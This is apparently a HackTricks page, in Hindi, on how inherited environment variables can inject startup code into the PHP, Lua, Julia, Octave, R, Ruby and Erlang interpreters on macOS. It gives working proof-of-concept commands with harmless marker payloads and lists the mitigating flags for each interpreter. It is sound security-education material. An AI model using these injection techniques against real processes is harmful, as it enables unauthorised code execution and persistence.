# Environment Variables के ज़रिए macOS Interpreter Startup Injection

{{#include ../../../banners/hacktricks-training.md}}

ये runtime-विशिष्ट techniques inherited environment variables का इस्तेमाल करके intended workload शुरू होने से पहले startup configuration चुनती हैं, code preload करती हैं या VM flags देती हैं। कुछ variants फ़ाइल-आधारित हैं; Lua और Erlang inline-code execution भी support करते हैं।

## PHP startup configuration

### `PHPRC` / `PHP_INI_SCAN_DIR` और `auto_prepend_file`

PHP CLI और CGI हर invocation पर configuration पढ़ते हैं। `PHPRC` attacker-readable `php.ini` चुन सकता है, जबकि `PHP_INI_SCAN_DIR` अतिरिक्त `.ini` files के लिए scan की जाने वाली directory को redirect कर सकता है। `auto_prepend_file` directive PHP से अनुरोधित script से पहले एक file parse करवाता है, इसलिए इस combination से startup code execution संभव हो जाता है।<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

एक विकल्प `.ini` फ़ाइल वाली निर्देशिका है:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` विकल्प `php.ini` को अनदेखा करता है; स्पष्ट trusted `-c` path को `PHPRC` पर प्राथमिकता मिलती है। ध्यान रखें कि long-lived server SAPI आम तौर पर web server शुरू होने पर configuration पढ़ता है, जबकि CLI और CGI हर invocation पर ऐसा करते हैं।<sup>[[1]](#references)</sup>

## Lua startup code

### `LUA_INIT`

Command-line विकल्पों या target script को process करने से पहले, standalone Lua interpreter `LUA_INIT_<major>_<minor>` को execute करता है या, यदि versioned variable मौजूद न हो, तो `LUA_INIT` को। `@` से शुरू होने वाली value किसी file का नाम बताती है; अन्य कोई भी value सीधे Lua code के रूप में evaluate की जाती है। इससे file-backed और fileless, दोनों तरह का startup execution संभव होता है।<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

इंटरप्रेटर के अनुसार सटीक versioned नाम बदलता है, उदाहरण के लिए `LUA_INIT_5_4`। `lua -E` startup code और Lua module paths समेत सभी environment variables को अनदेखा करता है।

## Julia startup depot

### `JULIA_DEPOT_PATH` और `startup.jl`

Julia आमतौर पर startup के समय अपने पहले depot से `config/startup.jl` चलाता है। `JULIA_DEPOT_PATH` depot list को नियंत्रित करता है, इसलिए इसे हमलावर द्वारा पढ़े जा सकने वाले tree पर सेट करने से अपने-आप लोड होने वाली startup file को redirect किया जा सकता है।<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

अंतिम separator उपयोगी है, जब victim को अपने सामान्य packages की भी ज़रूरत हो। `julia --startup-file=no` इस startup file को निष्क्रिय करता है। Launch करने से पहले variable को clear करें, क्योंकि यह package registries, environments, caches और code-loading locations को भी नियंत्रित करता है।

## GNU Octave startup फ़ाइलें

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave startup के दौरान valid Octave commands वाली कई फ़ाइलें execute करता है। `OCTAVE_SITE_INITFILE` site-wide startup file को override करता है और `OCTAVE_VERSION_INITFILE` version-specific file को override करता है, जिससे इनमें से कोई भी variable automatic execution को attacker-readable file पर redirect कर सकता है।<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` केवल `~/.octaverc` जैसी user files को छोड़ता है; यह ऊपर दिए गए site-file override को **नहीं** रोकता। Site files के लिए `--no-site-file` या सभी startup files को disable करने के लिए `--norc` / `-f` का उपयोग करें।<sup>[[7]](#references)</sup>

## R startup profiles और package loading

### `R_PROFILE_USER` / `R_PROFILE`

Startup के समय R, R code वाली site और user profile files को source करता है। `R_PROFILE` site profile चुनता है और `R_PROFILE_USER` user profile चुनता है, जिससे inherited environment किसी भी lookup को attacker-readable file की ओर redirect कर सकता है।<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` यूज़र प्रोफ़ाइल को छोड़ता है, `--no-site-file` साइट प्रोफ़ाइल को छोड़ता है, और `--vanilla` में ये दोनों सुरक्षा शामिल हैं। R पहले `R_ENVIRON` और `R_ENVIRON_USER` द्वारा चुनी गई environment files को प्रोसेस करता है, लेकिन वे फ़ाइलें केवल variables सेट करती हैं; profile variables ही arbitrary-code चलाने का सीधा तरीका हैं।

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` और लाइब्रेरी पाथ

R startup के दौरान `R_DEFAULT_PACKAGES` में comma से अलग किए गए packages को attach करता है। `Rscript` में `R_SCRIPT_DEFAULT_PACKAGES` को प्राथमिकता दी जाती है। इनमें से किसी भी variable को `R_LIBS`, `R_LIBS_USER` या `R_LIBS_SITE` के साथ मिलाने से R हमलावर द्वारा नियंत्रित installed package खोजकर लोड कर सकता है; उसका `.onLoad` या `.onAttach` hook अपने आप execute होता है।<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

इसके लिए structurally valid installed R package चाहिए, केवल एक loose `.R` file नहीं। `--vanilla` सीधे inherited variables को clear नहीं करता, इसलिए trusted wrapper को profile files disable करने के साथ-साथ default-package और library-path variables को unset या replace करना होगा।

## Ruby loader options

### RUBYOPT

Ruby किसी script को चलाने से पहले `RUBYOPT` environment variable से supported command-line switches parse करता है। Ruby, `RUBYOPT` में `-e` के ज़रिए code execution को अस्वीकार करता है, लेकिन `-I` library-search directory को prepend कर सकता है और `-r` किसी library को require कर सकता है। इसलिए attacker-controlled environment variables के साथ Ruby launch करने वाली process से attacker-controlled Ruby code load कराया जा सकता है।<sup>[[10]](#references)</sup>

`/tmp/inject.rb` बनाएँ:

```ruby:inject.rb
puts `whoami`
```

एक हानिरहित Ruby script बनाएं, जैसे `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

इसे नियंत्रित `RUBYOPT` मान के साथ चलाएँ:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

इस व्यवहार को अक्षम करने के लिए, script name से पहले `--disable=rubyopt` (या `--disable-rubyopt`) पास करें:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

`hello.rb` के बाद लिखा गया विकल्प स्क्रिप्ट को `ARGV` में पास किया जाता है; यह Ruby द्वारा `RUBYOPT` की पहले की प्रोसेसिंग को बंद नहीं करता।<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

`RUBYOPT` के अंदर `-I` से load directory को आगे जोड़ने के बजाय, अलग `RUBYLIB` environment variable Ruby के `$LOAD_PATH` में directories जोड़ता है। `RUBYOPT=-r<module>` के साथ मिलकर, यह `RUBYOPT` में `-I` की ज़रूरत के बिना हमलावर का code load करता है:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang और Elixir VM flags

### `ERL_AFLAGS`, `ERL_FLAGS`, और `ERL_ZFLAGS`

`erl` launcher `ERL_AFLAGS` को अपनी command line की शुरुआत में और `ERL_FLAGS` / `ERL_ZFLAGS` को अंत में जोड़ता है। चूँकि `-eval` VM initialization के दौरान Erlang expression evaluate करता है, इसलिए ये variables intended workload शुरू होने से पहले fileless code execution दे सकते हैं।<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix और कई Elixir releases अंततः Erlang VM शुरू करते हैं और ये flags विरासत में पा सकते हैं। सटीक release wrapper की पुष्टि करें: यह VM arguments को फिर से बना या sanitize कर सकता है, जबकि कुछ tooling में `ERL_AFLAGS`, `ERL_ZFLAGS` या `ELIXIR_ERL_OPTIONS` का स्पष्ट समर्थन होता है।<sup>[[12]](#references)</sup>

अधिकांश file-backed तकनीकों से अलग, `-eval` payload के लिए attacker-controlled file की ज़रूरत नहीं होती। किसी trusted wrapper को runtime शुरू करने से पहले सभी तीन Erlang flag variables (और Elixir के लिए `ELIXIR_ERL_OPTIONS`) साफ़ कर देने चाहिए; जब तक parser और क्रम को पूरी तरह समझ न लिया जाए, अलग-अलग VM flags को allowlist करने की कोशिश न करें।

## References

- [1] [PHP कॉन्फ़िगरेशन फ़ाइल](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 standalone interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [R सत्र शुरू होने पर initialization](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [R Installation and Administration: Add-on packages](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl` command and environment variables](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Elixir releases and VM environment options](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
